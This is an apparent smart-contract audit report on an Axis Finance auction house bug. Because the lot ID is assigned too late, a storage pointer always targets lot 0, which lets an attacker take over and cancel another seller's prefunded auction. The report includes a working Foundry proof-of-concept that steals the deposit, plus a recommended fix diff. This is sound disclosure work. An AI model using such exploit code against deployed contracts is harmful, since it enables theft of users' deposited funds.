Orbiting Opaque Kestrel

high

# Malicious user can overtake a prefunded auction and steal the deposited funds

## Summary
In the auction house whenever a new auction (lot) is created, its details are recorded at the 0th index in the `lotRouting` mapping. This allows for an attacker to create an auction right after an honest user and take over their auction, allowing them to steal funds in the case of a prefunded auction.

## Vulnerability Detail
When a new auction is created via [AuctionHouse#auction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164), it's routing details are recorded directly in storage at `lotRouting[lotId]` where `lotId` is the return value of the `auction()` function itself. Since the return value is declared as a variable at the function signature level, it is initialized with the value of `0`.

This means that when the `routing` [storage variable is declared](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174) (`Routing storage routing = lotRouting[lotId];`) it will always point to `lotRouting[0]` as the value of `lotId` is set a bit later in the `auction()` function to the correct index. This itself leads to the issue that an honest user can create a prefunded auction and an attacker can then come in, create a new auction themselves that is not prefunded and be immediately entitled to the honest user's prefunded funds by cancelling the auction they've just created as they're set as the `seller` of the lot at `lotRouting[0]`.

This attack is also possible because the `funding` attribute of a lot is only set if an auction is specified to be prefunded in its parameters at creation.
## Impact
The following POC demonstrates how an attacker can overtake an honest user's auction and steal the funds they've pre-deposited. The attacker only needs to ensure the base token of the malicious auction they are creating is the same as the one of the auction of the honest user. Once that's done, the attacker only needs to cancel the auction and the funds will be transferred to them.

To run the POC just create a file `AuctionHouseTest.t.sol` somewhere under the `./moonraker/test` directory, add `src=/src/` to **remappings.txt** and run it using `forge test --match-test test_overtake_auction_and_steal_prefunded_funds`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Libraries
import {Test} from "forge-std/Test.sol";
import {ERC20} from 'solmate/tokens/ERC20.sol';

import 'src/modules/Modules.sol';
import {Auction} from 'src/modules/Auction.sol';

import {AuctionHouse} from 'src/AuctionHouse.sol';
import {FixedPriceAuctionModule} from 'src/modules/auctions/FPAM.sol';

contract AuctionHouseTest is Test {
  AuctionHouse public auctionHouse;
  FixedPriceAuctionModule public fixedPriceAuctionModule;

  address public OWNER = makeAddr('Owner');
  address public PROTOCOL = makeAddr('Protocol');
  address public PERMIT2 = makeAddr('Permit 2');

  MockERC20 public baseToken = new MockERC20("Base", "BASE", 18);
  MockERC20 public quoteToken = new MockERC20("Quote", "QUOTE", 18);

  function setUp() public {
    vm.warp(1710965574);
    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);
    fixedPriceAuctionModule = new FixedPriceAuctionModule(address(auctionHouse));

    vm.prank(OWNER);
    auctionHouse.installModule(fixedPriceAuctionModule);
  }

  function test_overtake_auction_and_steal_prefunded_funds() public {
    // Step 1
    uint256 PREFUNDED_AMOUNT = 1_000e18;
    address USER = makeAddr('User');
    vm.startPrank(USER);
    baseToken.mint(PREFUNDED_AMOUNT);
    baseToken.approve(address(auctionHouse), PREFUNDED_AMOUNT);

    AuctionHouse.RoutingParams memory routingParams;
    routingParams.auctionType = keycodeFromVeecode(fixedPriceAuctionModule.VEECODE());
    routingParams.baseToken = baseToken;
    routingParams.quoteToken = quoteToken;
    routingParams.prefunded = true;

    Auction.AuctionParams memory auctionParams;
    auctionParams.start = uint48(block.timestamp + 1 weeks);
    auctionParams.duration = 5 days;
    auctionParams.capacity = uint96(PREFUNDED_AMOUNT);
    auctionParams.implParams =
      abi.encode(FixedPriceAuctionModule.FixedPriceParams({price: 1e18, maxPayoutPercent: 100_000}));

    auctionHouse.auction(routingParams, auctionParams, "");

    // Step 2
    address ATTACKER = makeAddr('Attacker');
    vm.startPrank(ATTACKER);

    routingParams.prefunded = false;
    auctionHouse.auction(routingParams, auctionParams, "");
	
    // ATTACKER is now the seller of the lot at lotRouting[0]; the lot's funding remains the same
    auctionHouse.cancel(0, "");

    assertEq(baseToken.balanceOf(ATTACKER), PREFUNDED_AMOUNT);
    assertEq(baseToken.balanceOf(USER), 0);
  }
}

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
      _mint(msg.sender, amount);
    }
}
```
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L194
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L211-L212
## Tool used
Manual Review
Foundry Forge

## Recommendation
```diff
diff --git a/moonraker/src/bases/Auctioneer.sol b/moonraker/src/bases/Auctioneer.sol
index a77585b..48c39d5 100644
--- a/moonraker/src/bases/Auctioneer.sol
+++ b/moonraker/src/bases/Auctioneer.sol
@@ -171,6 +171,9 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
             revert InvalidParams();
         }
 
+        // Increment lot count and get ID
+        lotId = lotCounter++;
+
         Routing storage routing = lotRouting[lotId];
 
         bool requiresPrefunding;
@@ -190,9 +193,6 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
                     || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18
             ) revert InvalidParams();
 
-            // Increment lot count and get ID
-            lotId = lotCounter++;
-
             // Call module auction function to store implementation-specific data
             (lotCapacity) =
                 auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);
```
